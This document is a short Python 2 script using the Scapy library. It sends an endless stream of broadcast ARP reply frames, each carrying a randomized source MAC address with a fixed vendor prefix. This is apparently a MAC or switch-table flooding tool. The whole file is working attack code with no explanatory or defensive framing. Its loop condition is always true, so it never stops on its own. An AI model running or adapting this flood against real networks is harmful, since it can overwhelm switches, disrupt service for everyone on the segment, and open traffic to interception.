#!/usr/bin/env python
from scapy.all import *

vendor = "03:5f:2a:"
destMAC = "FF:FF:FF:FF:FF:FF"
i = 0
while 1 < 100000:
	randMAC = vendor + ':'.join(RandMAC().split(':')[3:])
	print randMAC 
	sendp(Ether(src=randMAC ,dst=destMAC)/
	ARP(op=2, psrc="0.0.0.0", hwdst=destMAC)/Padding(load="X"*18),verbose=0)
	i += 1